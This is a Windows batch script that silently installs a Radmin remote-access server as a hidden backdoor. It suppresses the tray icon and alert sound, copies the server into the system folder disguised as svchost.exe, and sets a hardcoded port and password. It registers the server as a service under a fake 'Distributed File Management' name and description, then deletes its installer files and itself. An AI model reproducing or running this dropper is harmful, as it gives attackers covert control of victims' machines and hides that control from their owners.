@echo off

echo REGEDIT4> settings.reg
echo [-HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\]>> settings.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\]>> settings.reg
echo "DisableTrayIcon"=hex:01,00,00,00>> settings.reg
echo "DisableBeep"=hex:01,00,00,00>> settings.reg
regedit.exe /s settings.reg
del settings.reg

mkdir %SYSTEMROOT%\system

move _01 %SYSTEMROOT%\system\svchost.exe
move _02 %SYSTEMROOT%\system\admdll.dll
move _03 %SYSTEMROOT%\system\raddrv.dll

%SYSTEMROOT%\system\svchost.exe /install /silence
%SYSTEMROOT%\system\svchost.exe /port:715 /pass:bullshit /save /silence
%SYSTEMROOT%\system\svchost.exe /start

svcmgr.exe -c r_server "Distributed File Management"
echo REGEDIT4> settings.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\r_server\]>> settings.reg
echo "Description"="Manages distributions and transactions of critical system files between network clients and servers.">> settings.reg
regedit.exe /s settings.reg
del settings.reg

del hexec.exe
del svcmgr.exe
del package.exe
del deploy.bat